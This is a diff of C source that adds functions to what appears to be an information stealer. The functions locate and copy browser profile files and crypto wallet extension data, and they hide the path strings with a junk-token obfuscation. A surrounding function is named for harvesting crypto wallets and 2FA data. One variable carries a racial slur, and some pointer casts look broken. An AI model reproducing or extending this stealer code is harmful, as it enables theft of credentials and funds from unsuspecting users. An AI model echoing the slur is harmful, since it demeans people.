@@ -1,5 +1,64 @@
 #include "../HEADER/HEADER.c"
 
+void 
+LazyBrowserDataGrabber(LPCWSTR *BrowserAllInfo, 
+                      const WCHAR *Filename, 
+                      void ***SysInfo)
+{
+    WCHAR *ExtractedPath = (WCHAR *)calloc(260, sizeof(WCHAR));
+    wcscat(ExtractedPath, BrowserAllInfo[1]);
+    wcscat(ExtractedPath, L"\\");
+    wcscat(ExtractedPath, Filename);
+  
+    if (verifyFileStatus(ExtractedPath))
+    {
+        WCHAR *ProcessedPath = (WCHAR *)calloc(260, sizeof(WCHAR));
+        wcscat(ProcessedPath, BrowserAllInfo[0]); 
+        wcscat(ProcessedPath, L"/");
+        wcscat(ProcessedPath, BrowserAllInfo[2]); 
+        wcscat(ProcessedPath, L"/");
+        wcscat(ProcessedPath, Filename);
+
+        ExtractFileInfoViaNTDLL(ExtractedPath, &Filename, (size_t *)&BrowserAllInfo);
+        char *ProcessedData = ProccessingOrMapsTheWideCharacter(ProcessedPath);
+
+        if (BrowserAllInfo)
+        {
+            ProcessFilePathAndUpdateSession(*SysInfo, ProcessedData);
+            blabla((int)*SysInfo, Filename, (unsigned int)BrowserAllInfo);
+            blabla_0((char *)*SysInfo);
+        }
+
+        free(ProcessedPath);
+        free(ExtractedPath);
+    }
+}
+
+void 
+ProcessBrowserExtension(LPCWSTR *BrowserAllInfo, 
+                        const WCHAR *extensionIDs, 
+                        const WCHAR *WalletName, 
+                        void ***SysInfo)
+{
+    WCHAR *FULLpath = (WCHAR *)calloc(260, sizeof(WCHAR));
+    wcscat(FULLpath, BrowserAllInfo[1]);
+    wcscat(FULLpath, GetFilePath(L"\\Locedx765al Extensedx765ion Settinedx765gs\\")); 
+    wcscat(FULLpath, extensionIDs);
+
+    WCHAR *BrowserDataPath = (WCHAR *)calloc(260, sizeof(WCHAR));
+    wcscat(BrowserDataPath, BrowserAllInfo[0]); 
+    wcscat(BrowserDataPath, L"/");
+    wcscat(BrowserDataPath, BrowserAllInfo[2]); 
+    wcscat(BrowserDataPath, GetFilePath(L"/Extedx765ensioedx765ns/")); 
+    wcscat(BrowserDataPath, WalletName);
+
+    const WCHAR *TheNigger = GetFilePath(L"*edx765");
+    processPath((int)FULLpath, TheNigger, BrowserDataPath, 0, SysInfo);
+
+    free(FULLpath);
+    free(BrowserDataPath);
+}
+
 void __fastcall 
 CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo, 
                     void ***SysInfo)
